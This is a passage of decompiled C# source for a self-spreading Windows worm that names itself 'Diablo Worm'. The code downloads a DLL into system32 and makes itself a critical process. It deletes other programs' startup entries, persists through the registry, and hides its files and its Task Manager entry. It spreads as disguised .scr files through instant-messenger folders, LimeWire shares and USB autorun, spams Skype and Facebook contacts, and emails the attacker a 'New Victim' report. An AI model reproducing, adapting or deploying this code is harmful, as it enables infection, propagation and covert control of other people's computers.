			Process.EnterDebugMode();
			IntPtr handle = Process.GetCurrentProcess().Handle;
			int processInformation = 1;
			NtSetInformationProcess(handle, 29, ref processInformation, 4);
		}
	}

	public void dlllibrairy()
	{
		try
		{
			if (Operators.CompareString(libri, "1", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(downlibri, "C:\\WINDOWS\\system32\\Mozsqlite3.dll");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void PGP()
	{
		WebBrowser1.Navigate(urlweb);
	}

	public void checktask()
	{
		if (Operators.CompareString(checkck, "1", false) == 0)
		{
			Timer3.Start();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			LOL();
			botkills();
			checktask();
			pizaa();
			EmailN();
			Installs();
			PGP();
			critiqueprocess();
			persit();
			CacherFichier();
			Timer2.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void botkillv()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey.DeleteValue("Windows Update");
		RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey2.DeleteValue("Winupdate");
		RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey3.DeleteValue("svchost");
		RegistryKey registryKey4 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey4.DeleteValue("javaw");
		RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey5.DeleteValue("Audio");
		RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey6.DeleteValue("DarkCometRAT");
		RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey7.DeleteValue("msnmsgsr");
		RegistryKey registryKey8 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey8.DeleteValue("DanyHost");
		RegistryKey registryKey9 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey9.DeleteValue("Updater");
		RegistryKey registryKey10 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", writable: true);
		registryKey10.DeleteValue("winlogon");
		RegistryKey registryKey11 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		registryKey11.DeleteValue("winupdater");
		RegistryKey registryKey12 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		registryKey12.DeleteValue("explorer");
	}

	public void botclean()
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", writable: true)!.DeleteSubKeyTree("Run");
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", writable: true)!.DeleteSubKeyTree("Run");
			((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().Close();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
		{
			DeleteDirContents(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)));
		}
	}

	public void botkills()
	{
		if (Operators.CompareString(botkill, "1", false) == 0)
		{
			botkillv();
			botclean();
		}
	}

	public void DeleteDirContents(DirectoryInfo dir)
	{
		FileInfo[] files = dir.GetFiles();
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			fileInfo.Delete();
		}
		DirectoryInfo[] directories = dir.GetDirectories();
		DirectoryInfo[] array2 = directories;
		foreach (DirectoryInfo dir2 in array2)
		{
			DeleteDirContents(dir2);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Yahoo()
	{
		if (Operators.CompareString(TextBox26.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			_ = Assembly.GetExecutingAssembly().GetModules()[0];
			string executablePath = Application.get_ExecutablePath();
			string text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
			if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
			{
				return;
			}
			int num = 0;
			string[] directories = Directory.GetDirectories(text);
			int upperBound = directories.GetUpperBound(0);
			for (num = 0; num <= upperBound; num = checked(num + 1))
			{
				if (Operators.CompareString(FileSystem.Dir(directories[num], (FileAttribute)16), "", false) != 0 && !File.Exists(directories[num] + "\\ys.scr"))
				{
					File.Copy(executablePath, directories[num] + "\\ys.scr");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void P2P()
	{
		if (Operators.CompareString(TextBox17.get_Text(), "1", false) == 0)
		{
			try
			{
				string text = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));
				string text2 = "porno-movie.scr";
				File.Copy(Application.get_ExecutablePath(), text + text2);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string text3 = "porno-movie.scr";
				File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text3));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void EmailN()
	{
		try
		{
			if (Operators.CompareString(TextBox22.get_Text(), "0", false) == 0)
			{
			}
			if (File.Exists("C:\\WINDOWS\\Temp\\internet.txt"))
			{
				TextBox22.set_Text("0");
			}
			if (Operators.CompareString(TextBox22.get_Text(), "1", false) == 0)
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(TextBox24.get_Text());
				mailMessage.To.Add(TextBox24.get_Text());
				mailMessage.Subject = "+---New Victim !---+" + ((ServerComputer)MyProject.Computer).get_Name();
				mailMessage.Body = "[Diablo Worm /+\\ New Victim !]\r\n\r\nComputer Name:    " + ((ServerComputer)MyProject.Computer).get_Name() + "\r\nOS:    " + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName() + "\r\nRAM:    ";
				SmtpClient smtpClient = new SmtpClient("smtp.live.com");
				smtpClient.Port = Conversions.ToInteger(TextBox25.get_Text());
				smtpClient.Credentials = new NetworkCredential(TextBox24.get_Text(), TextBox23.get_Text());
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				StreamWriter streamWriter = new StreamWriter("C:\\WINDOWS\\Tempinternet.txt");
				streamWriter.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void USB()
	{
		if (Operators.CompareString(TextBox12.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			string programFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array = logicalDrives;
			for (int i = 0; i < array.Length; i = checked(i + 1))
			{
				programFiles = array[i];
				try
				{
					File.Copy(Application.get_ExecutablePath(), programFiles + "black.scr");
					StreamWriter streamWriter = new StreamWriter(programFiles + "\\autorun.inf");
					streamWriter.WriteLine("[autorun]");
					streamWriter.WriteLine("open=" + programFiles + "black.scr");
					streamWriter.WriteLine("shellexecute=" + programFiles, 1);
					streamWriter.Close();
					File.SetAttributes(programFiles + "autorun.inf", FileAttributes.Hidden);
					File.SetAttributes(programFiles + "black.scr", FileAttributes.Hidden);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void MSN()
	{
		_ = Assembly.GetExecutingAssembly().GetModules()[0];
		string executablePath = Application.get_ExecutablePath();
		string text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
		if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
		{
			return;
		}
		int num = 0;
		string[] directories = Directory.GetDirectories(text);
		int upperBound = directories.GetUpperBound(0);
		for (num = 0; num <= upperBound; num = checked(num + 1))
		{
			if (Operators.CompareString(FileSystem.Dir(directories[num], (FileAttribute)16), "", false) != 0 && !File.Exists(directories[num] + "\\picture.scr"))
			{
				File.Copy(executablePath, directories[num] + "\\picture.scr");
			}
		}
	}

	public void LAN()
	{
		if (Operators.CompareString(TextBox13.get_Text(), "1", false) != 0)
		{
		}
	}

	public void MSkypeS()
	{
		if (Operators.CompareString(TextBox14.get_Text(), "1", false) != 0)
		{
			return;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Skype4COM.Skype", ""));
		NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(objectValue, (Type)null, "Attach", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((IEnumerable)NewLateBinding.LateGet(objectValue, (Type)null, "Friends", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue2 = RuntimeHelpers.GetObjectValue(enumerator.Current);
				object[] array = new object[2];
				object obj = objectValue2;
				array[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, (Type)null, "Handle", new object[0], (string[])null, (Type[])null, (bool[])null));
				TextBox textBox = TextBox15;
				array[1] = textBox.get_Text();
				object[] array2 = array;
				bool[] array3 = new bool[2] { true, true };
				NewLateBinding.LateCall(objectValue, (Type)null, "SendMessage", array2, (string[])null, (Type[])null, array3, true);
				if (array3[0])
				{
					NewLateBinding.LateSetComplex(obj, (Type)null, "Handle", new object[1] { RuntimeHelpers.GetObjectValue(array2[0]) }, (string[])null, (Type[])null, true, false);
				}
				if (array3[1])
				{
					textBox.set_Text((string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string)));
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void CacherFichier()
	{
		if (Operators.CompareString(TextBox19.get_Text(), "1", false) != 0)
		{
			return;
		}
		if (Operators.CompareString(TextBox7.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName = "C:\\Windows\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo = new FileInfo(fileName);
				fileInfo.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox6.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName2 = "C:\\Windows\\Temp\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo2 = new FileInfo(fileName2);
				fileInfo2.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		if (Operators.CompareString(TextBox8.get_Text(), "1", false) == 0)
		{
			try
			{
				string fileName3 = "C:\\Windows\\System32\\" + TextBox5.get_Text() + ".exe";
				FileInfo fileInfo3 = new FileInfo(fileName3);
				fileInfo3.Attributes = FileAttributes.Hidden;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void persit()
	{
		if (Operators.CompareString(TextBox21.get_Text(), "1", false) == 0)
		{
			Thread thread = new Thread(RegPersistence.Persistence);
			thread.Start();
		}
	}

	public void FBWall(string message)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between Unknown and I4
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Expected O, but got Unknown
		//IL_00ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		if (Operators.CompareString(TextBox26.get_Text(), "1", false) != 0)
		{
			return;
		}
		try
		{
			WebBrowser val = new WebBrowser();
			val.Navigate("http://m.facebook.com/home.php?");
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = val.get_Document().get_All().GetEnumerator();
				while (enumerator.MoveNext())
				{
					HtmlElement val2 = (HtmlElement)enumerator.Current;
					if (Operators.CompareString(val2.GetAttribute("name"), "status", false) == 0)
					{
						val2.SetAttribute("value", message);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			IEnumerator enumerator2 = default(IEnumerator);
			try
			{
				enumerator2 = val.get_Document().get_All().GetEnumerator();
				while (enumerator2.MoveNext())
				{
					HtmlElement val3 = (HtmlElement)enumerator2.Current;
					if (Operators.CompareString(val3.GetAttribute("name"), "update", false) == 0)
					{
						val3.InvokeMember("click");
					}
				}
			}
			finally
			{
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		USB();
		LAN();
		MSkypeS();
		Yahoo();
		P2P();
		MSN();
		FBWall(TextBox15.get_Text());
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		HideProcess(Application.get_ProductName());
	}

	private object HideProcess(string pName, bool pHide = true)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int menuItemID = default(int);
		int num6 = default(int);
		int num7 = default(int);
		int num8 = default(int);
		int menu = default(int);
		int subMenu = default(int);
		int subMenu2 = default(int);
		int menuItemID2 = default(int);
		int menuItemID3 = default(int);
		int menuItemID4 = default(int);
		int menuItemID5 = default(int);
		Process process = default(Process);
		int num9 = default(int);
		Process[] processes = default(Process[]);
		Process[] array = default(Process[]);
		int num10 = default(int);
		int num11 = default(int);
		int num12 = default(int);
		int num13 = default(int);
		string text = default(string);
		int num14 = default(int);
		int num15 = default(int);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int hWnd;
					int wParam;
					int hWnd2;
					int hWnd3;
					int hWnd4;
					int hWnd5;
					int hWnd6;
					int wParam2;
					int hWnd7;
					int wParam3;
					int hWnd8;
					int hWnd9;
					int wParam4;
					int hWnd10;
					int hWnd11;
					int hWnd12;
					int hWnd13;
					string lpClassName;
					int hWnd14;
					int wParam5;
					string lParam;
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = 1;
						goto IL_0008;
					case 1598:
						{
							num2 = num;
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0020;
							case 4:
								goto IL_0026;
							case 5:
								goto IL_002c;
							case 6:
								goto IL_0032;
							case 7:
								goto IL_003e;
							case 8:
								goto IL_004b;
							case 9:
								goto IL_0058;
							case 10:
								goto IL_0065;
							case 11:
								goto IL_0072;
							case 12:
								goto IL_007f;
							case 13:
								goto IL_008c;
							case 14:
								goto IL_009a;
							case 15:
								goto IL_00a4;
							case 16:
								goto IL_00af;
							case 18:
								goto IL_00b8;
							case 19:
								goto IL_00c1;
							case 20:
							case 21:
								goto IL_00e1;
							case 22:
								goto IL_00ea;
							case 23:
							case 24:
								goto IL_0106;
							case 17:
								goto IL_0115;
							case 25:
								goto IL_0130;
							case 26:
								goto IL_014d;
							case 27:
								goto IL_015b;
							case 28:
								goto IL_0169;
							case 29:
								goto IL_0177;
							case 30:
								goto IL_0185;
							case 31:
								goto IL_0194;
							case 32:
								goto IL_01a1;
							case 33:
								goto IL_01b8;
							case 34:
							case 35:
								goto IL_01cc;
							case 36:
								goto IL_01d7;
							case 37:
								goto IL_01f4;
							case 38:
								goto IL_01fe;
							case 39:
								goto IL_021c;
							case 42:
								goto IL_0238;
							case 43:
								goto IL_023c;
							case 46:
								goto IL_025f;
							case 40:
							case 41:
							case 44:
							case 45:
								goto IL_0268;
							case 47:
								goto IL_0270;
							case 48:
								goto IL_0283;
							case 49:
								goto IL_02a5;
							case 50:
								goto IL_02b5;
							case 51:
							case 52:
								goto IL_02bd;
							case 53:
								goto IL_02c9;
							case 54:
								goto IL_02d5;
							case 55:
								goto IL_02f1;
							case 56:
								goto IL_0308;
							case 57:
								goto IL_0325;
							case 58:
								goto IL_0330;
							case 59:
								goto IL_0339;
							case 60:
								goto IL_0352;
							case 63:
								goto IL_036b;
							case 64:
								goto IL_036f;
							case 65:
								goto IL_0388;
							case 69:
								goto IL_03a1;
							case 70:
								goto IL_03a5;
							case 72:
								goto IL_03ae;
							case 73:
								goto IL_03b7;
							case 74:
							case 75:
								goto IL_03d7;
							case 76:
								goto IL_03e0;
							case 77:
							case 78:
								goto IL_03fc;
							case 71:
								goto IL_040b;
							case 79:
								goto IL_0426;
							case 80:
								goto IL_0434;
							case 81:
								goto IL_0442;
							case 82:
								goto IL_0450;
							case 83:
								goto IL_045e;
							case 84:
								goto IL_046d;
							case 85:
								goto IL_0489;
							case 86:
								goto IL_04a5;
							case 61:
							case 62:
							case 66:
							case 67:
							case 68:
							case 87:
							case 88:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 89:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0489:
						num = 85;
						hWnd = num5;
						wParam = menuItemID;
						lParam = Conversions.ToString(0);
						SendMessageA(hWnd, 273, wParam, ref lParam);
						goto IL_04a5;
						IL_0008:
						num = 2;
						lpClassName = null;
						lParam = "Windows Task Manager";
						num5 = FindWindowA(ref lpClassName, ref lParam);
						goto IL_0020;
						IL_0020:
						num = 3;
						num6 = 0;
						goto IL_0026;
						IL_0026:
						num = 4;
						num7 = 0;
						goto IL_002c;
						IL_002c:
						num = 5;
						num8 = 0;
						goto IL_0032;
						IL_0032:
						num = 6;
						menu = GetMenu(num5);
						goto IL_003e;
						IL_003e:
						num = 7;
						subMenu = GetSubMenu(menu, 2);
						goto IL_004b;
						IL_004b:
						num = 8;
						subMenu2 = GetSubMenu(subMenu, 1);
						goto IL_0058;
						IL_0058:
						num = 9;
						menuItemID = GetMenuItemID(subMenu, 0);
						goto IL_0065;
						IL_0065:
						num = 10;
						menuItemID2 = GetMenuItemID(subMenu2, 0);
						goto IL_0072;
						IL_0072:
						num = 11;
						menuItemID3 = GetMenuItemID(subMenu2, 1);
						goto IL_007f;
						IL_007f:
						num = 12;
						menuItemID4 = GetMenuItemID(subMenu2, 2);
						goto IL_008c;
						IL_008c:
						num = 13;
						menuItemID5 = GetMenuItemID(subMenu2, 3);
						goto IL_009a;
						IL_009a:
						num = 14;
						if (pHide)
						{
							goto IL_00a4;
						}
						goto IL_03a1;
						IL_00a4:
						num = 15;
						process = new Process();
						goto IL_00af;
						IL_00af:
						num = 16;
						num9 = 1;
						goto IL_0115;
						IL_0115:
						num = 17;
						hWnd2 = num5;
						hWnd3 = num6;
						lParam = null;
						lpClassName = null;
						num6 = FindWindowExA(hWnd2, hWnd3, ref lParam, ref lpClassName);
						goto IL_00b8;
						IL_00b8:
						num = 18;
						if (num7 == 0)
						{
							goto IL_00c1;
						}
						goto IL_00e1;
						IL_00c1:
						num = 19;
						hWnd4 = num6;
						lParam = "SysListView32";
						lpClassName = "Processes";
						num7 = FindWindowExA(hWnd4, 0, ref lParam, ref lpClassName);
						goto IL_00e1;
						IL_00e1:
						num = 21;
						if (num8 == 0)
						{
							goto IL_00ea;
						}
						goto IL_0106;
						IL_00ea:
						num = 22;
						hWnd5 = num7;
						lParam = "SysHeader32";
						lpClassName = null;
						num8 = FindWindowExA(hWnd5, 0, ref lParam, ref lpClassName);
						goto IL_0106;
						IL_0106:
						num = 24;
						num9++;
						if (num9 <= 7)
						{
							goto IL_0115;
						}
						goto IL_0130;
						IL_0130:
						num = 25;
						hWnd6 = num5;
						wParam2 = menuItemID5;
						lParam = Conversions.ToString(0);
						SendMessageA(hWnd6, 273, wParam2, ref lParam);
						goto IL_014d;
						IL_014d:
						num = 26;
						EnableMenuItem(menu, menuItemID, 1);
						goto IL_015b;
						IL_015b:
						num = 27;
						EnableMenuItem(menu, menuItemID2, 1);
						goto IL_0169;
						IL_0169:
						num = 28;
						EnableMenuItem(menu, menuItemID3, 1);
						goto IL_0177;
						IL_0177:
						num = 29;
						EnableMenuItem(menu, menuItemID4, 1);
						goto IL_0185;
						IL_0185:
						num = 30;
						EnableMenuItem(menu, menuItemID5, 1);
						goto IL_0194;
						IL_0194:
						num = 31;
						EnableWindow(num8, 0);
						goto IL_01a1;
						IL_01a1:
						num = 32;
						if (ListView1.get_Items().get_Count() > 0)
						{
							goto IL_01b8;
						}
						goto IL_01cc;
						IL_01b8:
						num = 33;
						ListView1.get_Items().Clear();
						goto IL_01cc;
						IL_01cc:
						num = 35;
						processes = Process.GetProcesses();
						goto IL_01d7;
						IL_01d7:
						num = 36;
						array = processes;
						num10 = 0;
						goto IL_01e2;
						IL_01e2:
						if (num10 < array.Length)
						{
							process = array[num10];
							goto IL_01f4;
						}
						goto IL_0270;
						IL_04a5:
						num = 86;
						EnableWindow(num8, 1);
						break;
						IL_01f4:
						num = 37;
						num11++;
						goto IL_01fe;
						IL_01fe:
						num = 38;
						if (Operators.CompareString(process.ProcessName.ToString(), "Idle", false) == 0)
						{
							goto IL_021c;
						}
						goto IL_0238;
						IL_021c:
						num = 39;
						ListView1.get_Items().Add("System Idle Process");
						goto IL_0268;
						IL_0238:
						num = 42;
						goto IL_023c;
						IL_023c:
						num = 43;
						ListView1.get_Items().Add(process.ProcessName.ToString());
						goto IL_0268;
						IL_0268:
						num10++;
						goto IL_025f;
						IL_025f:
						num = 46;
						goto IL_01e2;
						IL_0270:
						num = 47;
						num12 = num11 - 1;
						num13 = 0;
						goto IL_027d;
						IL_027d:
						if (num13 <= num12)
						{
							goto IL_0283;
						}
						goto IL_02c9;
						IL_0283:
						num = 48;
						text = ListView1.get_Items().get_Item(num13).get_Text()
							.ToString();
						goto IL_02a5;
						IL_02a5:
						num = 49;
						if (Operators.CompareString(text, pName, false) == 0)
						{
							goto IL_02b5;
						}
						goto IL_02bd;
						IL_02b5:
						num = 50;
						num14 = num13;
						goto IL_02bd;
						IL_02bd:
						num = 52;
						num13++;
						goto IL_027d;
						IL_02c9:
						num = 53;
						LockWindowUpdate(num7);
						goto IL_02d5;
						IL_02d5:
						num = 54;
						hWnd7 = num5;
						wParam3 = menuItemID;
						lParam = Conversions.ToString(0);
						SendMessageA(hWnd7, 273, wParam3, ref lParam);
						goto IL_02f1;
						IL_02f1:
						num = 55;
						hWnd8 = num7;
						lParam = null;
						SendMessageA(hWnd8, 4144, 0, ref lParam);
						goto IL_0308;
						IL_0308:
						num = 56;
						hWnd9 = num7;
						wParam4 = num14;
						lParam = Conversions.ToString(0);
						SendMessageA(hWnd9, 4104, wParam4, ref lParam);
						goto IL_0325;
						IL_0325:
						num = 57;
						LockWindowUpdate(0);
						goto IL_0330;
						IL_0330:
						num = 58;
						if (num5 == 0)
						{
							goto IL_0339;
						}
						goto IL_036b;
						IL_0339:
						num = 59;
						if (Timer1.get_Interval() == 800)
						{
							break;
						}
						goto IL_0352;
						IL_0352:
						num = 60;
						Timer1.set_Interval(800);
						break;
						IL_036b:
						num = 63;
						goto IL_036f;
						IL_036f:
						num = 64;
						if (Timer1.get_Interval() == 2500)
						{
							break;
						}
						goto IL_0388;
						IL_0388:
						num = 65;
						Timer1.set_Interval(2500);
						break;
						IL_03a1:
						num = 69;
						goto IL_03a5;
						IL_03a5:
						num = 70;
						num15 = 1;
						goto IL_040b;
						IL_040b:
						num = 71;
						hWnd10 = num5;
						hWnd11 = num6;
						lParam = null;
						lpClassName = null;
						num6 = FindWindowExA(hWnd10, hWnd11, ref lParam, ref lpClassName);
						goto IL_03ae;
						IL_03ae:
						num = 72;
						if (num7 == 0)
						{
							goto IL_03b7;
						}
						goto IL_03d7;
						IL_03b7:
						num = 73;
						hWnd12 = num6;
						lParam = "SysListView32";
						lpClassName = "Processes";
						num7 = FindWindowExA(hWnd12, 0, ref lParam, ref lpClassName);
						goto IL_03d7;
						IL_03d7:
						num = 75;
						if (num8 == 0)
						{
							goto IL_03e0;
						}
						goto IL_03fc;
						IL_03e0:
						num = 76;
						hWnd13 = num7;
						lParam = "SysHeader32";
						lpClassName = null;
						num8 = FindWindowExA(hWnd13, 0, ref lParam, ref lpClassName);
						goto IL_03fc;
						IL_03fc:
						num = 78;
						num15++;
						if (num15 <= 7)
						{
							goto IL_040b;
						}
						goto IL_0426;
						IL_0426:
						num = 79;
						EnableMenuItem(menu, menuItemID, 0);
						goto IL_0434;
						IL_0434:
						num = 80;
						EnableMenuItem(menu, menuItemID2, 0);
						goto IL_0442;
						IL_0442:
						num = 81;
						EnableMenuItem(menu, menuItemID3, 0);
						goto IL_0450;
						IL_0450:
						num = 82;
						EnableMenuItem(menu, menuItemID4, 0);
						goto IL_045e;
						IL_045e:
						num = 83;
						EnableMenuItem(menu, menuItemID5, 0);
						goto IL_046d;
						IL_046d:
						num = 84;
						hWnd14 = num5;
						wParam5 = menuItemID3;
						lParam = Conversions.ToString(0);
						SendMessageA(hWnd14, 273, wParam5, ref lParam);
						goto IL_0489;
						end_IL_0000_2:
						break;
					}
					num = 88;
					obj = true;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 1598;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public int ProcessesRunning(string ProcessName)
	{
		try
		{
			return checked(Process.GetProcessesByName(ProcessName).GetUpperBound(0) + 1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int result = 0;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
